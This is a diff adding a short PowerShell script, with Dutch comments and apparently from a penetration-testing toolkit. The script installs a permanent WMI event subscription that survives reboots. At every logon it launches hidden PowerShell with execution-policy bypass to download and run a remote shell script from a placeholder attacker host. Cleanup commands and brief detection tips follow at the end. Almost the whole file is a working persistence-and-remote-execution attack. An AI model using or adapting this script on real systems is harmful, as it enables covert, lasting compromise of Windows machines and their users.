@@ -1,0 +1,27 @@
+# WMI Event Subscription - Persistentie via WMI (vereist admin)
+# Maakt een permanent WMI event dat een payload triggert
+# Bij elke login:
+$filterArgs = @{
+    Name = 'PentestFilter'
+    EventNameSpace = 'root\CIMv2'
+    QueryLanguage = 'WQL'
+    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession'"
+}
+$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs
+$consumerArgs = @{
+    Name = 'PentestConsumer'
+    CommandLineTemplate = 'powershell.exe -ep bypass -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP/payloads/amsi-shell.ps1'')"'
+}
+$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs
+$bindingArgs = @{
+    Filter = $filter
+    Consumer = $consumer
+}
+Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs
+# Opruimen:
+Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object { $_.Name -eq 'PentestFilter' } | Remove-WmiObject
+Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object { $_.Name -eq 'PentestConsumer' } | Remove-WmiObject
+Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
+# Tip: WMI subscriptions overleven reboots
+# Tip: Detectie: Event ID 5861 (WMI activity)
+# Tip: Autoruns van Sysinternals toont WMI subscriptions
